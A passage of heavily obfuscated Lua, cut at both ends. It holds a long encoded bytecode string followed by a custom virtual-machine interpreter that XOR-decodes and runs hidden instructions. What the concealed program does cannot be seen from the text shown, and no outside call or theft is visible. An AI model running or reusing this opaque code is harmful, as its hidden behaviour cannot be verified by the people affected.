319X2B731UC32H0326Q312F25E328T31QW320R315431CP2U9326H319K328R324U315Q328332CM32HX2YK32HZ3293312132I22BQ32I4324S328S311429J32I1311Q32I33147316931K631WD2TC31DL31JK2GK2TB27G27I27K27M27O27Q27S27U27W27Y27823U1V1B26M23T24P22O1Z24O22E21B24522I25826P21Q2501Q23924622E24925P1924Y25I25R26G22726K26O21E21L24C24D26S23726L21425C26424H24525G24E21T22U1F23T26Z1F25D22731LV22J29L29N2ZU31LS2IY2P02BF2BH2Z32BL2BN31K9315S2PB31LQ2C02C227526A22Z23J24E24Z23Q22721X25D21M22226E21R26723O2242652381I25421H26U24G21225D24J24S24D21P23T24632A826X26M2631R23W22J23L25B25E26O25326L2331M22V26X25G22U24L23621C22L2DN2DP2T62DT2ZT2ZP2P42DZ2E12E3310G2E62E82EA2VB2EE2IA2EI31OQ31WY317E322R2EV32H922J2A62A82AA2AC2AE2WJ2AI32N2318032BZ31QK31ZG319C312B2Y831VK313F2ZD2ZJ31Z323F236320C2BX31QM3195315V31CR31172U92IV31QG2ZK2ZF32O632CX325L313F32O631QF2Z1312D32OB328W2YL2A431VO2ZF32OK326J3248328331J32Z0326Q32CX3151327Y321831A231202OV32952TA32AW32OZ31K7313131CZ31YX2IV2OU2BP326N2BQ32PC314M32252YJ324131RN310G3100329D320N2752EC32PK32PO31UD31H131HA31U031UD31CJ2UF31K3329W31IN2DY314B31QU31TK2AQ31RI319X311J31SW318Z2AQ32AK31RO31542HF2C231T232AU32HD314B2742ZI326E314B31YJ326E2UF31UC2GM2TI311N32AY31U7313232AD22J1632BG31T62AQ314B32BM31T6311J2TI3100311J311J31UC274326W310432OT29P324C319X31J32752A4315732C932HE2P829P312D2BX29P31TG32HJ31RN2DS2A432CI312D315N32CG320R32RY2WG2BX31SL31TK32RQ32CM32C232SB310N312D32CF32NL32SI32RQ312H314J2YU321B32CW2VB32FL31UD2C22Y8312D312F32SU313F325632DM32FM2EC22P2YK2WG312F32T4324S32T0312Q31ZT3159312D315432DZ32GB22J2WG315432E432DR22J31CG2Y831U2312F32TO31CR32D532A031SG310M312D32BL32EL32GA31SW2DW2WG31U231002DW2DW32TF2752YU2YU31SW2WG32EP32NK31V1310823332F627Z312D32BH2Y832T62ZF32UN32GT32CX329V32SS2EC313X32SV313F32UX313F31A02YD32TC32CX315432DN31UD1A32FB313F32V932G832TU27531SG31U232TY312Q32GM31U232TF326B32UB32H1319X312D32B0312F32UR31TK27E32D3319X32BT2BQ32H031UK312F320B2YA31YV31UF31542YJ32AN2YM32AT31V032HH27731R4319X29J31H132H031GI312F21M2Z12Z031YX3154310229J321X32NM325F22J315D2P8221326E31BJ326L326F319Z31ZP32IK32P422J312B32X332P42ZJ31YN2ZQ3295310U2DS32P9315E32X432XI31QJ32PF31V52YJ328M27531SS310K32XS31RN31UQ32PW329R31UD2EC31UC32PU27532QP31UZ321431CJ2TI31DY32Q232TI32HH32Q632RY32Q92BQ32QB31AA22J32QH32AU32QG31RO2AQ315432QK31D032AX31U731CL32QR32H132C732QV32I832AU32YA32R01532R3311J32YP312Q32BN32RC31T632RB31T631SW32RF32WZ322D27832RJ2P832RL2P832RO2P8312D32RP27532RT314L32RW32CO32US324C32S132ZO32S632S532S432US32S832RY32HB32SC2P82WG329I32SG32CX2DS32SH32ZZ32SM2FM32UC315L2GM31N832V72UF1T2YK32SW2ZF330O32DM31YH330N32T5313F330S32TB32TM312D27432TG31U22WG27422L21932TM318Z32TP313F331A313F2ZN32VD32CW32TV32G932CX32TZ331J310M32AH32U332TH32U632FX331232UA324T32AH32UE32ZZ32UH2BQ32UJ31QR32UY32AW32UO313F3324313F32VU32VQ32YC27532SS2UF32V0330Q31HM32I52ZF326E32V3331032YS332D22J32VC32TM312F332Q312F192Z12IV32VE22J32VG331K32VJ32TH31U2331232VN331V32US32VR32O72783329310432VX32BO32BU32W12Z22ZF1032H5310432W731AB32WA32HD32WD32FH310332WG2YL32WJ32NM31322ZF21L32HH32WQ31AA310R2WG31GI32NT31YY313E31JA31KB31QJ31GD32OT31KF31V52Y8324A31GL310G32WU323T32WW32WY2P832V231LD3259275');local Fz_a=(bit or bit32);local Fz_d=Fz_a and Fz_a.bxor or function(Fz_a,Fz_b)local Fz_c,Fz_d,Fz_e=1,0,10 while Fz_a>0 and Fz_b>0 do local Fz_f,Fz_e=Fz_a%2,Fz_b%2 if Fz_f~=Fz_e then Fz_d=Fz_d+Fz_c end Fz_a,Fz_b,Fz_c=(Fz_a-Fz_f)/2,(Fz_b-Fz_e)/2,Fz_c*2 end if Fz_a<Fz_b then Fz_a=Fz_b end while Fz_a>0 do local Fz_b=Fz_a%2 if Fz_b>0 then Fz_d=Fz_d+Fz_c end Fz_a,Fz_c=(Fz_a-Fz_b)/2,Fz_c*2 end return Fz_d end local function Fz_c(Fz_b,Fz_a,Fz_c)if Fz_c then local Fz_a=(Fz_b/2^(Fz_a-1))%2^((Fz_c-1)-(Fz_a-1)+1);return Fz_a-Fz_a%1;else local Fz_a=2^(Fz_a-1);return(Fz_b%(Fz_a+Fz_a)>=Fz_a)and 1 or 0;end;end;local Fz_a=1;local function Fz_b()local Fz_c,Fz_b,Fz_e,Fz_f=Fz_h(Fz_j,Fz_a,Fz_a+3);Fz_c=Fz_d(Fz_c,91)Fz_b=Fz_d(Fz_b,91)Fz_e=Fz_d(Fz_e,91)Fz_f=Fz_d(Fz_f,91)Fz_a=Fz_a+4;return(Fz_f*16777216)+(Fz_e*65536)+(Fz_b*256)+Fz_c;end;local function Fz_i()local Fz_b=Fz_d(Fz_h(Fz_j,Fz_a,Fz_a),91);Fz_a=Fz_a+1;return Fz_b;end;local function Fz_f()local Fz_b,Fz_c=Fz_h(Fz_j,Fz_a,Fz_a+2);Fz_b=Fz_d(Fz_b,91)Fz_c=Fz_d(Fz_c,91)Fz_a=Fz_a+2;return(Fz_c*256)+Fz_b;end;local function Fz_q()local Fz_a=Fz_b();local Fz_b=Fz_b();local Fz_e=1;local Fz_d=(Fz_c(Fz_b,1,20)*(2^32))+Fz_a;local Fz_a=Fz_c(Fz_b,21,31);local Fz_b=((-1)^Fz_c(Fz_b,32));if(Fz_a==0)then if(Fz_d==0)then return Fz_b*0;else Fz_a=1;Fz_e=0;end;elseif(Fz_a==2047)then return(Fz_d==0)and(Fz_b*(1/0))or(Fz_b*(0/0));end;return Fz_m(Fz_b,Fz_a-1023)*(Fz_e+(Fz_d/(2^52)));end;local Fz_m=Fz_b;local function Fz_n(Fz_b)local Fz_c;if(not Fz_b)then Fz_b=Fz_m();if(Fz_b==0)then return'';end;end;Fz_c=Fz_e(Fz_j,Fz_a,Fz_a+Fz_b-1);Fz_a=Fz_a+Fz_b;local Fz_b={}for Fz_a=1,#Fz_c do Fz_b[Fz_a]=Fz_k(Fz_d(Fz_h(Fz_e(Fz_c,Fz_a,Fz_a)),91))end return Fz_r(Fz_b);end;local Fz_a=Fz_b;local function Fz_m(...)return{...},Fz_l('#',...)end local function Fz_j()local Fz_k={};local Fz_d={};local Fz_a={};local Fz_h={[#{{496;249;560;936};{211;841;945;368};}]=Fz_d,[#{"1 + 1 = 111";{484;684;725;675};{652;630;183;953};}]=nil,[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{864;329;939;562};}]=Fz_a,[#{{600;226;368;21};}]=Fz_k,};local Fz_a=Fz_b()local Fz_e={}for Fz_c=1,Fz_a do local Fz_b=Fz_i();local Fz_a;if(Fz_b==0)then Fz_a=(Fz_i()~=0);elseif(Fz_b==2)then Fz_a=Fz_q();elseif(Fz_b==3)then Fz_a=Fz_n();end;Fz_e[Fz_c]=Fz_a;end;for Fz_a=1,Fz_b()do Fz_d[Fz_a-1]=Fz_j();end;for Fz_h=1,Fz_b()do local Fz_a=Fz_i();if(Fz_c(Fz_a,1,1)==0)then local Fz_d=Fz_c(Fz_a,2,3);local Fz_g=Fz_c(Fz_a,4,6);local Fz_a={Fz_f(),Fz_f(),nil,nil};if(Fz_d==0)then Fz_a[3]=Fz_f();Fz_a[4]=Fz_f();elseif(Fz_d==1)then Fz_a[3]=Fz_b();elseif(Fz_d==2)then Fz_a[3]=Fz_b()-(2^16)elseif(Fz_d==3)then Fz_a[3]=Fz_b()-(2^16)Fz_a[4]=Fz_f();end;if(Fz_c(Fz_g,1,1)==1)then Fz_a[2]=Fz_e[Fz_a[2]]end if(Fz_c(Fz_g,2,2)==1)then Fz_a[3]=Fz_e[Fz_a[3]]end if(Fz_c(Fz_g,3,3)==1)then Fz_a[4]=Fz_e[Fz_a[4]]end Fz_k[Fz_h]=Fz_a;end end;Fz_h[3]=Fz_i();return Fz_h;end;local function Fz_i(Fz_a,Fz_h,Fz_f)Fz_a=(Fz_a==true and Fz_j())or Fz_a;return(function(...)local Fz_d=Fz_a[1];local Fz_e=Fz_a[3];local Fz_j=Fz_a[2];local Fz_a=Fz_m local Fz_b=1;local Fz_n=-1;local Fz_p={};local Fz_m={...};local Fz_l=Fz_l('#',...)-1;local Fz_k={};local Fz_c={};for Fz_a=0,Fz_l do if(Fz_a>=Fz_e)then Fz_p[Fz_a-Fz_e]=Fz_m[Fz_a+1];else Fz_c[Fz_a]=Fz_m[Fz_a+#{{979;9;356;907};}];end;end;local Fz_a=Fz_l-Fz_e+1 local Fz_a;local Fz_e;while true do Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[1];if Fz_e<=58 then if Fz_e<=28 then if Fz_e<=13 then if Fz_e<=6 then if Fz_e<=2 then if Fz_e<=0 then if(Fz_c[Fz_a[2]]<Fz_c[Fz_a[4]])then Fz_b=Fz_a[3];else Fz_b=Fz_b+1;end;elseif Fz_e>1 then Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];else if(Fz_c[Fz_a[2]]<Fz_c[Fz_a[4]])then Fz_b=Fz_a[3];else Fz_b=Fz_b+1;end;end;elseif Fz_e<=4 then if Fz_e==3 then Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]/Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]-Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]/Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]*Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_b=Fz_a[3];else Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];end;elseif Fz_e==5 then Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]+Fz_c[Fz_a[4]];else do return end;end;elseif Fz_e<=9 then if Fz_e<=7 then local Fz_e;Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];do return end;elseif Fz_e==8 then if(Fz_c[Fz_a[2]]~=Fz_a[4])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;else if(Fz_c[Fz_a[2]]~=Fz_c[Fz_a[4]])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;end;elseif Fz_e<=11 then if Fz_e==10 then local Fz_e;Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_c[Fz_e+1])Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_c[Fz_e+1])Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_c[Fz_e+1])Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]={};Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];do return end;else if Fz_c[Fz_a[2]]then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;end;elseif Fz_e==12 then Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]+Fz_a[4];else local Fz_e;Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))end;elseif Fz_e<=20 then if Fz_e<=16 then if Fz_e<=14 then local Fz_d=Fz_a[3];local Fz_b=Fz_c[Fz_d]for Fz_a=Fz_d+1,Fz_a[4]do Fz_b=Fz_b..Fz_c[Fz_a];end;Fz_c[Fz_a[2]]=Fz_b;elseif Fz_e==15 then Fz_c[Fz_a[2]][Fz_c[Fz_a[3]]]=Fz_a[4];else local Fz_e;Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_h[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_h[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=(Fz_a[3]~=0);Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];do return end;end;elseif Fz_e<=18 then if Fz_e>17 then local Fz_d=Fz_a[2];local Fz_e=Fz_c[Fz_d]local Fz_f=Fz_c[Fz_d+2];if(Fz_f>0)then if(Fz_e>Fz_c[Fz_d+1])then Fz_b=Fz_a[3];else Fz_c[Fz_d+3]=Fz_e;end elseif(Fz_e<Fz_c[Fz_d+1])then Fz_b=Fz_a[3];else Fz_c[Fz_d+3]=Fz_e;end else local Fz_e;Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_c[Fz_a[3]]]=Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];if(Fz_c[Fz_a[2]]~=Fz_a[4])then Fz_b=Fz_b+1;else Fz_b=Fz_a[3];end;end;elseif Fz_e>19 then Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];else Fz_c[Fz_a[2]][Fz_c[Fz_a[3]]]=Fz_c[Fz_a[4]];end;elseif Fz_e<=24 then if Fz_e<=22 then if Fz_e>21 then Fz_c[Fz_a[2]]=(Fz_a[3]~=0);else local Fz_e;Fz_c[Fz_a[2]]={};Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_a[3]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_c[Fz_a[3]]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]][Fz_c[Fz_a[3]]]=Fz_c[Fz_a[4]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=(Fz_a[3]~=0);Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];do return end;end;elseif Fz_e>23 then if(Fz_a[2]<Fz_c[Fz_a[4]])then Fz_b=Fz_a[3];else Fz_b=Fz_b+1;end;else Fz_c[Fz_a[2]]=Fz_i(Fz_j[Fz_a[3]],nil,Fz_f);end;elseif Fz_e<=26 then if Fz_e==25 then Fz_c[Fz_a[2]]=#Fz_c[Fz_a[3]];else local Fz_j=Fz_j[Fz_a[3]];local Fz_g;local Fz_e={};Fz_g=Fz_o({},{__index=function(Fz_b,Fz_a)local Fz_a=Fz_e[Fz_a];return Fz_a[1][Fz_a[2]];end,__newindex=function(Fz_c,Fz_a,Fz_b)local Fz_a=Fz_e[Fz_a]Fz_a[1][Fz_a[2]]=Fz_b;end;});for Fz_f=1,Fz_a[4]do Fz_b=Fz_b+1;local Fz_a=Fz_d[Fz_b];if Fz_a[1]==88 then Fz_e[Fz_f-1]={Fz_c,Fz_a[3]};else Fz_e[Fz_f-1]={Fz_h,Fz_a[3]};end;Fz_k[#Fz_k+1]=Fz_e;end;Fz_c[Fz_a[2]]=Fz_i(Fz_j,Fz_g,Fz_f);end;elseif Fz_e>27 then Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_a[4]];else Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]/Fz_a[4];end;elseif Fz_e<=43 then if Fz_e<=35 then if Fz_e<=31 then if Fz_e<=29 then Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];elseif Fz_e==30 then Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]+Fz_a[4];else Fz_c[Fz_a[2]][Fz_a[3]]=Fz_a[4];end;elseif Fz_e<=33 then if Fz_e==32 then local Fz_e;Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e](Fz_c[Fz_e+1])Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_f[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_a[3];else Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]-Fz_c[Fz_a[4]];end;elseif Fz_e>34 then Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];else Fz_c[Fz_a[2]]=Fz_i(Fz_j[Fz_a[3]],nil,Fz_f);end;elseif Fz_e<=39 then if Fz_e<=37 then if Fz_e>36 then local Fz_a=Fz_a[2]Fz_c[Fz_a](Fz_c[Fz_a+1])else local Fz_e;Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]%Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]]+Fz_a[4];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_e=Fz_a[2]Fz_c[Fz_e]=Fz_c[Fz_e](Fz_g(Fz_c,Fz_e+1,Fz_a[3]))Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]=Fz_c[Fz_a[3]][Fz_c[Fz_a[4]]];Fz_b=Fz_b+1;Fz_a=Fz_d[Fz_b];Fz_c[Fz_a[2]]